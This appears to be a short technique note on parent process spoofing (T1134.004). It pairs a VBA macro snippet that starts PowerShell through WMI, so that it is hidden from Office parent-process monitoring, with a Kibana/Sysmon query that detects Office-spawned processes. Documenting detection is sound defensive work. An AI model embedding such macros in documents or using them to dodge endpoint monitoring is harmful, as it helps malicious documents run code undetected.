# Parent-Process-Spoofing

Spoof via WMI call
In this instance, PowerShell will be a child of **WmiPrvSE.exe** rather than MS Word.
``````
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
``````

## Detection
From the Kibana home page, expand the menu in the top-left and then select **Discover** underneath the **Analytics** header.  In the search box, enter:

Detect PowerPoint process injection
``````
event.module : sysmon and event.type : process_start and process.parent.executable : *EXCEL.EXE | *WINWORD.EXE | *POWERPNT.EXE
``````

## Tools
########
########

```meta
ttp: T1134.004
requirements: 
results: 
description: 
```